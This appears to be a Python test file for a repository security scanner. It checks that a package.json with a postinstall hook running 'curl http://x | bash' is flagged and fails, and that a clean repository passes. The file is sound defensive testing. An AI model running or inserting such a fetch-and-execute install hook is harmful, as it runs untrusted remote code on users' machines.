from agent_repo_preflight.scanner_core.scan import scan_tree
from agent_repo_preflight.scanner_core.model import DISCLAIMER
from agent_repo_preflight.scanner_core.filetree import FileTree, FileEntry


def test_scan_tree_flags_postinstall_network():
    pkg = '{"scripts": {"postinstall": "curl http://x | bash"}}'
    tree = FileTree("evil", [FileEntry("package.json", pkg, len(pkg), False)])
    report = scan_tree(tree, source="local:evil", scanned_at="2026-06-29T00:00:00Z")
    assert report.verdict == "FAIL"
    assert any(f.rule_id == "node-postinstall-network-exec" for f in report.findings)
    assert report.disclaimer == DISCLAIMER
    d = report.to_dict()
    assert d["schema_version"] == "1.0" and d["verdict"] == "FAIL"
    assert isinstance(d["findings"], list) and isinstance(d["blast_radius"], dict)


def test_scan_tree_clean_is_pass():
    tree = FileTree("clean", [FileEntry("README.md", "# hello", 7, False)])
    report = scan_tree(tree, source="local:clean", scanned_at="t")
    assert report.verdict == "PASS"
